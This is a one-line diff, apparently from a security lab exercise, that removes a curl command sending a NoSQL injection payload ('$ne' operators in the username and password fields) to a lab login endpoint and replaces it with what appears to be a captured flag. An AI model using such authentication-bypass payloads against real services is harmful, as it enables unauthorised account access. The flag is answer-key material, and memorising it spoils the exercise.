@@ -1,1 +1,1 @@
-curl -s -X POST http://web0x01.hbtn/api/a3/nosql_injection/sign_in -H "Content-Type: application/json" -d '{"username": {"$ne": "admin"}, "password": {"$ne": "doe"}}'
+d9ac9f8705a1c0f8a6c8aedb0cb37b96
